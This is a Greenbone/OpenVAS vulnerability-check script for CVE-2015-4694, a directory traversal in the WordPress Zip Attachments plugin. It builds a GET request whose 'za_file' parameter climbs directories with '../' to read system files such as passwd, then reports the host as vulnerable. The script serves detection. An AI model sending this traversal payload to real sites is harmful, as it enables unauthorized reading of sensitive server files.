CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.807058" );
	script_version( "2021-09-17T14:01:43+0000" );
	script_cve_id( "CVE-2015-4694" );
	script_bugtraq_id( 75211 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-09-17 14:01:43 +0000 (Fri, 17 Sep 2021)" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2016-11-28 19:29:00 +0000 (Mon, 28 Nov 2016)" );
	script_tag( name: "creation_date", value: "2016-02-05 12:32:21 +0530 (Fri, 05 Feb 2016)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_name( "WordPress Zip Attachments Plugin 'download.php' Directory Traversal Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with WordPress
  Zip Attachments plugin and is prone to directory traversal vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not." );
	script_tag( name: "insight", value: "The flaw is due to the insufficient
  validation of user supplied input via 'za_file' parameter in 'download.php'
  script." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to download arbitrary files and obtain sensitive information." );
	script_tag( name: "affected", value: "WordPress Zip Attachments plugin versions
  before 1.1.5" );
	script_tag( name: "solution", value: "Update to version 1.1.5 or higher." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "https://wpvulndb.com/vulnerabilities/8047" );
	script_xref( name: "URL", value: "http://www.openwall.com/lists/oss-security/2015/06/12/4" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc", "os_detection.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "https://wordpress.org/plugins/zip-attachments" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
files = traversal_files();
for pattern in keys( files ) {
	file = files[pattern];
	url = dir + "/wp-content/plugins/zip-attachments/download.php?za_file=../../../../../" + file + "&za_filename=passwd";
	if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "Content-Disposition: attachment; filename=\"passwd.zip" )){
		report = http_report_vuln_url( port: http_port, url: url );
		security_message( port: http_port, data: report );
		exit( 0 );
	}
}
exit( 99 );

